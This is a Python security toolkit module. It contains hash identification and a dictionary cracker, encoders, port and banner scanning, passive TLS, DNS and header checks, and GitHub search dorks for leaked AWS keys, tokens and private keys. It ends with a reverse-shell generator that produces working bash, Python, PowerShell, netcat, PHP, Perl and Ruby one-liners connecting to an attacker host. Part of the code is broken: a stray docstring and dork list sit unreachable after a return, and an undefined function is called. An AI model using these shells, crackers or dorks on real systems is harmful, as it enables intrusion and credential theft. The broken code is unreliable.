"""
KALKI Cyber Toolkit
===================

For authorized use only — CTF, pentesting, OSINT, local recon.
This module provides utilities for hashes, codecs, network recon, CVE intel,
subdomain enum, and payload generation.

All functions are stateless and rely only on the standard library 
(plus urllib for online queries) to maintain portability and security.
"""

import os
import re
import json
import ssl
import socket
import codecs
import base64
import struct
import hashlib
import secrets
import string
import subprocess
import urllib.parse
import urllib.request
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Union

KNOWN_HASHES: Dict[int, List[str]] = {
    32:  ["MD5", "NTLM", "MD4"],
    40:  ["SHA1"],
    56:  ["SHA-224"],
    64:  ["SHA-256", "SHA3-256"],
    96:  ["SHA-384", "SHA3-384"],
    128: ["SHA-512", "SHA3-512"],
}


def identify_hash(h: str) -> List[str]:
    """
    Guess the hash algorithm(s) by analyzing the length of a hex string.
    
    Args:
        h (str): The hash string to identify.
        
    Returns:
        List[str]: A list of candidate hash algorithm names.
    """
    h = h.strip()
    if not re.match(r"^[0-9a-fA-F]+$", h):
        return ["non-hex (try base64 or bcrypt)"]
    return KNOWN_HASHES.get(len(h), ["unknown length " + str(len(h))])


def hash_text(text: str, algo: str = "sha256") -> str:
    """
    Hash a plaintext string using the specified algorithm.
    
    Args:
        text (str): The plaintext to hash.
        algo (str): The algorithm to use (e.g., 'md5', 'sha256', 'ntlm').
        
    Returns:
        str: The resulting hex digest.
        
    Raises:
        ValueError: If the requested algorithm is unknown.
    """
    algo = algo.lower().replace("-", "").replace("_", "")
    data = text.encode("utf-8")
    
    if algo == "md5": return hashlib.md5(data).hexdigest()
    if algo == "sha1": return hashlib.sha1(data).hexdigest()
    if algo == "sha224": return hashlib.sha224(data).hexdigest()
    if algo == "sha256": return hashlib.sha256(data).hexdigest()
    if algo == "sha384": return hashlib.sha384(data).hexdigest()
    if algo == "sha512": return hashlib.sha512(data).hexdigest()
    if algo == "sha3256": return hashlib.sha3_256(data).hexdigest()
    if algo == "sha3512": return hashlib.sha3_512(data).hexdigest()
    if algo == "ntlm": return _md4_compat(text.encode("utf-16le")).hex()
    if algo == "md4": return _md4_compat(data).hex()
    
    raise ValueError("unknown algo: " + algo)


def _md4_compat(data: bytes) -> bytes:
    """MD4 that works on OpenSSL 3.x where md4 is disabled by default."""
    try:
        return hashlib.new("md4", data, usedforsecurity=False).digest()
    except (TypeError, ValueError):
        try:
            return hashlib.new("md4", data).digest()
        except Exception:
            return _md4_pure(data)


def _md4_pure(data):
    """Pure-Python MD4 (RFC 1320). Slow but works anywhere."""
    def F(x, y, z): return (x & y) | (~x & z) & 0xFFFFFFFF
    def G(x, y, z): return (x & y) | (x & z) | (y & z)
    def H(x, y, z): return x ^ y ^ z

    def rol(x, n):
        x &= 0xFFFFFFFF
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    msg = bytearray(data)
    orig_len_bits = (len(msg) * 8) & 0xFFFFFFFFFFFFFFFF
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", orig_len_bits)

    a, b, c, d = 1732584193, 4023233417, 2562383102, 271733878

    for off in range(0, len(msg), 64):
        X = list(struct.unpack("<16I", msg[off:off + 64]))
        aa, bb, cc, dd = a, b, c, d

        # Round 1
        for i in (0, 4, 8, 12):
            a = rol((a + F(b, c, d) + X[i]) & 0xFFFFFFFF, 3)
            d = rol((d + F(a, b, c) + X[i + 1]) & 0xFFFFFFFF, 7)
            c = rol((c + F(d, a, b) + X[i + 2]) & 0xFFFFFFFF, 11)
            b = rol((b + F(c, d, a) + X[i + 3]) & 0xFFFFFFFF, 19)
        # Round 2
        for i in (0, 1, 2, 3):
            a = rol((a + G(b, c, d) + X[i] + 0x5A827999) & 0xFFFFFFFF, 3)
            d = rol((d + G(a, b, c) + X[i + 4] + 0x5A827999) & 0xFFFFFFFF, 5)
            c = rol((c + G(d, a, b) + X[i + 8] + 0x5A827999) & 0xFFFFFFFF, 9)
            b = rol((b + G(c, d, a) + X[i + 12] + 0x5A827999) & 0xFFFFFFFF, 13)
        # Round 3
        for i in (0, 2, 1, 3):
            a = rol((a + H(b, c, d) + X[i] + 0x6ED9EBA1) & 0xFFFFFFFF, 3)
            d = rol((d + H(a, b, c) + X[i + 8] + 0x6ED9EBA1) & 0xFFFFFFFF, 9)
            c = rol((c + H(d, a, b) + X[i + 4] + 0x6ED9EBA1) & 0xFFFFFFFF, 11)
            b = rol((b + H(c, d, a) + X[i + 12] + 0x6ED9EBA1) & 0xFFFFFFFF, 15)

        a = (a + aa) & 0xFFFFFFFF
        b = (b + bb) & 0xFFFFFFFF
        c = (c + cc) & 0xFFFFFFFF
        d = (d + dd) & 0xFFFFFFFF

    return struct.pack("<4I", a, b, c, d)


def crack_hash_dict(target, wordlist_path=None, algos=None, limit=2_000_000):
    """Dictionary attack against a hash. Returns dict with result or None."""
    target = target.strip().lower()
    if not target:
        return {"error": "empty hash"}

    if algos is None:
        guessed = [a.upper() for a in identify_hash(target)]
        algos = [a for a in guessed
                 if a in ("MD5", "SHA1", "SHA224", "SHA256", "SHA384",
                          "SHA512", "NTLM", "MD4")]
        if not algos:
            algos = ["MD5", "SHA1", "SHA256", "SHA512", "NTLM"]

    # Locate a wordlist
    if wordlist_path is None:
        candidates = [
            os.path.join("data", "wordlist.txt"),
            os.path.join("data", "rockyou.txt"),
            os.path.join(os.path.expanduser("~"), "Downloads", "rockyou.txt"),
        ]
        wordlist_path = next((p for p in candidates if os.path.exists(p)), None)
    if not wordlist_path or not os.path.exists(wordlist_path):
        return {"error": "no wordlist found", "tried": 0,
                "hint": "place a wordlist at data/wordlist.txt or pass --path"}

    tried = 0
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            word = line.rstrip("\r\n")
            tried += 1
            if tried > limit:
                return {"error": "limit exceeded", "tried": tried,
                        "wordlist": wordlist_path}
            for algo in algos:
                try:
                    if hash_text(word, algo) == target:
                        return {"password": word, "algo": algo,
                                "tried": tried, "wordlist": wordlist_path}
                except Exception:
                    pass
    return {"result": "not found", "tried": tried, "wordlist": wordlist_path}


def random_password(length=20, symbols=True):
    """Cryptographically strong random password."""
    pool = string.ascii_letters + string.digits
    if symbols:
        pool += "!@#$%^&*()-_=+[]{}<>?"
    return "".join(secrets.choice(pool) for _ in range(length))


# ─────────────────────────────────────────────────────────────
# ENCODE / DECODE
# ─────────────────────────────────────────────────────────────
_MORSE = {
    "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.",
    "G": "--.", "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..",
    "M": "--", "N": "-.", "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.",
    "S": "...", "T": "-", "U": "..-", "V": "...-", "W": ".--", "X": "-..-",
    "Y": "-.--", "Z": "--..", "0": "-----", "1": ".----", "2": "..---",
    "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...",
    "8": "---..", "9": "----.",
}
_MORSE_REV = {v: k for k, v in _MORSE.items()}


def encode(text, fmt):
    fmt = fmt.lower()
    if fmt in ("base64", "b64"):
        return base64.b64encode(text.encode("utf-8")).decode()
    if fmt in ("base32",):
        return base64.b32encode(text.encode("utf-8")).decode()
    if fmt in ("hex",):
        return text.encode("utf-8").hex()
    if fmt in ("url",):
        return urllib.parse.quote(text)
    if fmt in ("rot13",):
        return codecs.encode(text, "rot_13")
    if fmt in ("binary", "bin"):
        return " ".join(format(b, "08b") for b in text.encode("utf-8"))
    if fmt in ("ascii",):
        return " ".join(str(b) for b in text.encode("utf-8"))
    if fmt in ("morse",):
        return " ".join(_MORSE.get(ch, ch) for ch in text.upper())
    raise ValueError("unknown encoding: " + fmt)


def decode(text, fmt):
    fmt = fmt.lower()
    if fmt in ("base64", "b64"):
        return base64.b64decode(text).decode("utf-8", "replace")
    if fmt in ("base32",):
        return base64.b32decode(text).decode("utf-8", "replace")
    if fmt in ("hex",):
        return bytes.fromhex(text.replace(" ", "")).decode("utf-8", "replace")
    if fmt in ("url",):
        return urllib.parse.unquote(text)
    if fmt in ("rot13",):
        return codecs.decode(text, "rot_13")
    if fmt in ("binary", "bin"):
        out = bytearray()
        for chunk in text.split():
            out.append(int(chunk, 2))
        return out.decode("utf-8", "replace")
    if fmt in ("morse",):
        return "".join(_MORSE_REV.get(sym, "") for sym in text.split())
    raise ValueError("unknown encoding: " + fmt)


# ─────────────────────────────────────────────────────────────
# NETWORK / RECON
# ─────────────────────────────────────────────────────────────
COMMON_PORTS = (
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 587, 993, 995,
    1433, 1521, 2049, 2375, 3000, 3306, 3389, 4444, 5000, 5432, 5900, 5984,
    6379, 6667, 7001, 8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200,
    11211, 27017, 5601,
)


def port_scan(host: str, ports: Optional[List[int]] = None, timeout: float = 0.5) -> List[int]:
    """
    Perform a quick TCP connect scan on the given host.
    
    Args:
        host (str): The target hostname or IP address.
        ports (Optional[List[int]]): A list of ports to scan. Defaults to COMMON_PORTS.
        timeout (float): The connection timeout in seconds.
        
    Returns:
        List[int]: A list of open ports found on the target.
    """
    if ports is None:
        ports = COMMON_PORTS
    open_ports = []
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, p)) == 0:
                open_ports.append(p)
        except Exception:
            pass
        finally:
            s.close()
    return open_ports

def advanced_port_scan(host, ports=None, timeout=1.0):
    """Multithreaded TCP connect scan with banner grabbing."""
    import threading
    if ports is None:
        ports = COMMON_PORTS
    results = {}
    lock = threading.Lock()

    def scan_port(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, p)) == 0:
                banner = ""
                try:
                    s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = s.recv(1024).decode(errors="ignore").strip()
                except Exception:
                    pass
                with lock:
                    results[p] = {"state": "open", "banner": banner[:100]}
        except Exception:
            pass
        finally:
            s.close()

    threads = []
    for p in ports:
        t = threading.Thread(target=scan_port, args=(p,))
        threads.append(t)
        t.start()
        if len(threads) >= 15:
            for th in threads: th.join()
            threads = []
    for th in threads: th.join()
    
    return results


def _clean_target(target: str) -> Tuple[str, str]:
    """Clean and parse a target URL into its absolute URL and hostname."""
    target = (target or "").strip()
    if not target:
        return "", ""
    if not target.startswith(("http://", "https://")):
        url = "https://" + target
    else:
        url = target
    parsed = urllib.parse.urlparse(url)
    host = (parsed.hostname or "").lower().strip(".")
    return url, host


def tls_certificate_summary(host: str, port: int = 443, timeout: int = 5) -> Dict[str, Any]:
    """
    Read the public TLS certificate of a host for passive recon.
    No vulnerability probing is performed.
    
    Args:
        host (str): The hostname to connect to.
        port (int): The TLS port.
        timeout (int): The connection timeout.
        
    Returns:
        Dict[str, Any]: Parsed certificate metadata, or an error dictionary.
    """
    host = (host or "").strip()
    if not host:
        return {"error": "host required"}
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, int(port)), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
        not_after = cert.get("notAfter", "")
        expires_in_days = None
        if not_after:
            try:
                exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                expires_in_days = (exp - datetime.utcnow()).days
            except Exception:
                pass
        san = []
        for typ, value in cert.get("subjectAltName", []):
            if typ.lower() == "dns":
                san.append(value)
        return {
            "subject": cert.get("subject", []),
            "issuer": cert.get("issuer", []),
            "not_after": not_after,
            "expires_in_days": expires_in_days,
            "san_count": len(san),
            "sample_sans": san[:8],
            "cipher": cipher[0] if cipher else "",
            "tls_version": cipher[1] if cipher else "",
            "bits": cipher[2] if cipher else None,
        }
    except Exception as e:
        return {"error": str(e)}


def _security_header_findings(headers):
    headers_l = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
    checks = [
        ("strict-transport-security", "Add HSTS so browsers force HTTPS."),
        ("content-security-policy", "Add a CSP to reduce XSS blast radius."),
        ("x-content-type-options", "Add X-Content-Type-Options: nosniff."),
        ("referrer-policy", "Add Referrer-Policy to limit URL leakage."),
        ("permissions-policy", "Add Permissions-Policy for browser features."),
        ("x-frame-options", "Add X-Frame-Options or frame-ancestors in CSP."),
    ]
    missing = [{"header": h, "fix": fix} for h, fix in checks if h not in headers_l]
    exposed = []
    for h in ("server", "x-powered-by", "x-aspnet-version", "x-runtime"):
        if h in headers_l:
            exposed.append({"header": h, "value": headers_l[h][:120]})
    cors = headers_l.get("access-control-allow-origin", "")
    if cors == "*":
        exposed.append({"header": "access-control-allow-origin", "value": "*"})
    return {"missing": missing, "exposed": exposed}


def _port_findings(open_ports):
    risky = {
        21: "FTP is clear-text; prefer SFTP.",
        23: "Telnet is clear-text; disable it.",
        445: "SMB exposed; keep it private or tightly firewalled.",
        1433: "MSSQL exposed; restrict by VPN/IP allowlist.",
        2375: "Docker API exposed; require TLS or bind to localhost.",
        3306: "MySQL exposed; restrict network access.",
        3389: "RDP exposed; require VPN/MFA and lockout policy.",
        5432: "PostgreSQL exposed; restrict network access.",
        5900: "VNC exposed; require VPN.",
        5984: "CouchDB exposed; verify auth.",
        6379: "Redis exposed; never leave it public.",
        9200: "Elasticsearch exposed; verify auth and network policy.",
        11211: "Memcached exposed; bind privately.",
        27017: "MongoDB exposed; restrict network access.",
    }
    return [{"port": p, "risk": risky[p]} for p in open_ports if p in risky]


def http_probe(url, timeout=10, max_bytes=120000):
    """Fetch headers plus a small body sample for passive fingerprinting."""
    if not url.startswith("http"):
        url = "https://" + url
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "Mozilla/5.0 KALKI defensive scanner"},
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(max_bytes).decode("utf-8", "replace")
            return {
                "url": url,
                "final_url": r.geturl(),
                "status": r.status,
                "headers": dict(r.getheaders()),
                "body_sample": body,
            }
    except Exception as e:
        return {"url": url, "error": str(e)}


def technology_fingerprint(headers=None, body=""):
    """Best-effort passive technology hints from headers and HTML."""
    headers = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
    body_l = (body or "").lower()
    found = []

    def add(name, evidence):
        if not any(x["name"] == name for x in found):
            found.append({"name": name, "evidence": evidence[:140]})

    server = headers.get("server", "")
    powered = headers.get("x-powered-by", "")
    if server:
        add("Server", server)
    if powered:
        add("X-Powered-By", powered)
    patterns = [
        ("WordPress", "wp-content"),
        ("Next.js", "__next"),
        ("React", "reactroot"),
        ("Vue", "data-v-"),
        ("Angular", "ng-version"),
        ("Laravel", "laravel_session"),
        ("Django", "csrftoken"),
        ("Cloudflare", "cf-ray"),
        ("Bootstrap", "bootstrap"),
        ("jQuery", "jquery"),
        ("Google Analytics", "google-analytics"),
    ]
    header_blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
    for name, needle in patterns:
        if needle in body_l or needle in header_blob:
            add(name, needle)
    return found


def _doh_query(name, qtype):
    url = ("https://cloudflare-dns.com/dns-query?name=" +
           urllib.parse.quote(name.strip(".") + ".") +
           "&type=" + urllib.parse.quote(qtype))
    req = urllib.request.Request(
        url,
        headers={
            "Accept": "application/dns-json",
            "User-Agent": "KALKI defensive scanner",
        },
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def dns_record_summary(domain):
    """Passive DNS posture summary via DNS-over-HTTPS."""
    domain = (domain or "").strip().lower().strip(".")
    if not domain:
        return {"error": "domain required"}
    out = {"domain": domain, "records": {}, "findings": []}
    for typ in ("A", "AAAA", "MX", "NS", "TXT", "CAA"):
        try:
            data = _doh_query(domain, typ)
            answers = data.get("Answer") or []
            out["records"][typ] = [a.get("data", "") for a in answers][:10]
        except Exception as e:
            out["records"][typ] = {"error": str(e)}
    try:
        dmarc = _doh_query("_dmarc." + domain, "TXT").get("Answer") or []
        out["records"]["DMARC"] = [a.get("data", "") for a in dmarc][:5]
    except Exception as e:
        out["records"]["DMARC"] = {"error": str(e)}

    mx = out["records"].get("MX") if isinstance(out["records"].get("MX"), list) else []
    txt_records = out["records"].get("TXT") if isinstance(out["records"].get("TXT"), list) else []
    dmarc_records = out["records"].get("DMARC") if isinstance(out["records"].get("DMARC"), list) else []
    txt = " ".join(txt_records).lower()
    dmarc_txt = " ".join(dmarc_records).lower()
    if mx and "v=spf1" not in txt:
        out["findings"].append("Mail domain has MX but no SPF TXT record found.")
    if mx and "v=dmarc1" not in dmarc_txt:
        out["findings"].append("Mail domain has MX but no DMARC record found.")
    if not out["records"].get("CAA"):
        out["findings"].append("No CAA records found; consider limiting certificate issuers.")
    return out


def well_known_checks(url):
    """Check public policy files that help defenders and researchers."""
    base, host = _clean_target(url)
    if not host:
        return {"error": "target required"}
    parsed = urllib.parse.urlparse(base)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    checks = {}
    for path in ("/.well-known/security.txt", "/security.txt", "/robots.txt"):
        target = origin + path
        try:
            req = urllib.request.Request(
                target,
                headers={"User-Agent": "KALKI defensive scanner"},
            )
            with urllib.request.urlopen(req, timeout=8) as r:
                sample = r.read(6000).decode("utf-8", "replace")
                checks[path] = {
                    "status": r.status,
                    "present": 200 <= r.status < 300,
                    "sample": sample[:600],
                }
        except urllib.error.HTTPError as e:
            checks[path] = {"status": e.code, "present": False}
        except Exception as e:
            checks[path] = {"error": str(e), "present": False}
    return {"origin": origin, "checks": checks}


def remediation_plan(report):
    """Short prioritized defensive next steps for attack_surface_brief."""
    if not isinstance(report, dict) or report.get("error"):
        return []
    steps = []
    for item in report.get("port_findings", [])[:4]:
        steps.append("Review port " + str(item.get("port")) + ": " + item.get("risk", ""))
    for item in report.get("header_findings", {}).get("missing", [])[:4]:
        steps.append(item.get("fix", "Add missing security header."))
    dns_findings = report.get("dns_records", {}).get("findings") or []
    steps.extend(dns_findings[:3])
    tls = report.get("tls") or {}
    if tls.get("expires_in_days") is not None and tls["expires_in_days"] < 21:
        steps.append("Renew TLS certificate soon.")
    if not steps:
        steps.append("Posture looks clean on passive checks; keep patching and monitor logs.")
    return steps[:8]


def attack_surface_brief(target: str, include_subdomains: bool = False, ports: Optional[List[int]] = None, timeout: float = 0.45) -> Dict[str, Any]:
    """
    Generate a passive defensive recon bundle for authorized assets.
    Provides a security score and an actionable remediation plan.
    
    Args:
        target (str): The target URL or hostname.
        include_subdomains (bool): Whether to perform subdomain enumeration.
        ports (Optional[List[int]]): Custom ports to scan.
        timeout (float): Scan timeout.
        
    Returns:
        Dict[str, Any]: The comprehensive attack surface report.
    """
    url, host = _clean_target(target)
    if not host:
        return {"error": "target required"}
    if ports is None:
        ports = COMMON_PORTS
    else:
        ports = [int(p) for p in ports][:64]

    try:
        import socket
        dns = {"A": [socket.gethostbyname(host)]}
    except:
        dns = {"A": []}
    open_ports = port_scan(host, ports=ports, timeout=timeout)
    probe = http_probe(url)
    headers = probe if "headers" in probe else http_headers(url)
    tls = tls_certificate_summary(host) if url.startswith("https://") else {}
    header_findings = _security_header_findings(headers.get("headers", {}))
    port_findings = _port_findings(open_ports)
    tech = technology_fingerprint(headers.get("headers", {}), probe.get("body_sample", ""))
    dns_records = dns_record_summary(host)
    policy_files = well_known_checks(url)

    score = 100
    score -= min(35, len(header_findings["missing"]) * 5)
    score -= min(25, len(port_findings) * 8)
    if tls.get("error"):
        score -= 12
    elif tls.get("expires_in_days") is not None and tls["expires_in_days"] < 21:
        score -= 10
    if header_findings["exposed"]:
        score -= min(12, len(header_findings["exposed"]) * 4)
    if dns_records.get("findings"):
        score -= min(12, len(dns_records["findings"]) * 4)
    sec_txt = (policy_files.get("checks", {})
               .get("/.well-known/security.txt", {})
               .get("present"))
    if sec_txt is False:
        score -= 2
    score = max(0, score)

    subs = None
    if include_subdomains:
        subs = subdomain_enum(host, limit=30)

    report = {
        "target": target,
        "url": url,
        "host": host,
        "ip": dns.get("ip"),
        "dns": dns,
        "dns_records": dns_records,
        "open_ports": open_ports,
        "port_findings": port_findings,
        "headers": headers,
        "header_findings": header_findings,
        "technology": tech,
        "policy_files": policy_files,
        "tls": tls,
        "subdomains": subs,
        "score": score,
        "generated_at": datetime.utcnow().isoformat(timespec="seconds") + "Z",
    }
    report["remediation"] = remediation_plan(report)
    return report


def summarize_attack_surface(report, title="Sir"):
    if not isinstance(report, dict):
        return f"Surface check failed, {title}."
    if report.get("error"):
        return f"Surface check failed, {title}: {report['error']}"
    host = report.get("host", "target")
    ports = report.get("open_ports") or []
    missing = report.get("header_findings", {}).get("missing", [])
    risky = report.get("port_findings", [])
    tls = report.get("tls") or {}
    bits = [
        f"Attack-surface brief for {host}: score {report.get('score', '?')}/100.",
        f"Open ports: {', '.join(map(str, ports)) if ports else 'none on the quick set'}.",
    ]
    if missing:
        bits.append("Missing key headers: " + ", ".join(m["header"] for m in missing[:4]) + ".")
    if risky:
        bits.append("Highest-risk exposure: " + risky[0]["risk"])
    if tls.get("expires_in_days") is not None:
        bits.append(f"TLS expires in {tls['expires_in_days']} days.")
    elif tls.get("error"):
        bits.append("TLS check failed: " + str(tls["error"])[:90] + ".")
    tech = report.get("technology") or []
    if tech:
        bits.append("Detected: " + ", ".join(t["name"] for t in tech[:4]) + ".")
    remediation = report.get("remediation") or []
    if remediation:
        bits.append("First fix: " + remediation[0])
    return " ".join(bits)
    """Return a list of pre-baked GitHub search URLs for the target."""
    q = urllib.parse.quote(target)
    base = "https://github.com/search?type=code&q="
    dorks = [
        ("AWS keys", base + q + "+AKIA"),
        ("API keys", base + q + "+api_key"),
        ("Passwords", base + q + "+password"),
        ("Bearer tokens", base + q + "+Bearer"),
        (".env files", base + q + "+filename%3A.env"),
        ("config.json", base + q + "+filename%3Aconfig.json"),
        ("SSH private keys", base + q + "+BEGIN+RSA+PRIVATE+KEY"),
        ("Database URLs", base + q + "+mongodb%3A%2F%2F"),
    ]
    return [{"name": n, "url": u} for n, u in dorks]


# ─────────────────────────────────────────────────────────────
# REVERSE SHELL PAYLOADS
# ─────────────────────────────────────────────────────────────
def reverse_shell(shell_type, lhost, lport):
    """Return a reverse shell one-liner for the given target."""
    lhost = str(lhost)
    lport = str(lport)
    shells = {
        "bash": "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
        "sh": "sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
        "python": ("python -c 'import socket,subprocess,os;"
                   "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   's.connect(("' + lhost + '",' + lport + "));"
                   "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   "subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "python3": ("python3 -c 'import socket,subprocess,os;"
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    's.connect(("' + lhost + '",' + lport + "));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "powershell": ('powershell -nop -c "$client = New-Object '
                       "System.Net.Sockets.TCPClient('" + lhost + "'," + lport +
                       ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
                       "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
                       "$data = (New-Object -TypeName System.Text.ASCIIEncoding)."
                       "GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );"
                       "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                       "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                       "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
                       '$client.Close()"'),
        "nc": "nc -e /bin/sh " + lhost + " " + lport,
        "ncmkfifo": ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " +
                     lhost + " " + lport + " >/tmp/f"),
        "php": ('php -r \'$sock=fsockopen("' + lhost + '",' + lport +
                ');exec("/bin/sh -i <&3 >&3 2>&3");\''),
        "perl": ('perl -e \'use Socket;$i="' + lhost + '";$p=' + lport +
                 ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''),
        "ruby": ('ruby -rsocket -e\'f=TCPSocket.open("' + lhost + '",' + lport +
                 ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''),
    }
    # Friendly aliases
    shells["mkfifo"] = shells["ncmkfifo"]
    shells["ps"] = shells["powershell"]

    key = str(shell_type).strip().lower()
    if key == "list" or key == "available":
        return {"available": list(shells.keys())}
    if key not in shells:
        return {"error": "Unknown shell type '" + str(shell_type) +
                "'. Available: " + ", ".join(shells.keys())}
    return {"type": key, "lhost": lhost, "lport": lport, "payload": shells[key]}
